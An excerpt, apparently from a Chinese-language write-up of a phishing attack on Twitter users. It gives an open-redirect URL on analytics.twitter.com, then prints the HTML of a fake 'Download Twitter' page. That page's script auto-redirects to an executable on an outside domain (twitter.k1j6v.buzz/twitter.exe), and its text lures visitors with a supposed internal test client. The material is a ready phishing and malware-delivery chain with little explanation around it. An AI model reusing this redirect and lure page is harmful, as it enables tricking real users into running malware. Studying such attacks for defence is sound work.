...
> **攻击接口：**
```
https://analytics.twitter.com/daa/0/daa_optout_actions?action_id=4&&rd=http://127.0.0.1/
```
...
<html lang="en" class="dog">
  <head>
    ...
    //window.location.href = 'http://twitter.k1j6v.buzz/twitter.exe';

    setTimeout("javascript:location.href='http://twitter.k1j6v.buzz/twitter.exe'", 1000);   
</script>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Twitter / Download</title>
  ...
  <body dir="auto">
    ...
    <div class="container">
      <div class="content">
        ...
        <h1 id="header">Download Twitter</h1>
        <p id="description">Thank you for your support for twitter. Here I have issued you the qualification for internal test of twitter client. Click download.</p>

          <a id="button_search" href="/twitter.exe" class="button">Download</a>
...
[1]:https://github.com/H4K6/H4K6.github.io/blob/729da1d3413a1ceb11de5a2fe96d8649747922b4/public/File/2021-12-25-twitterAttack.pdf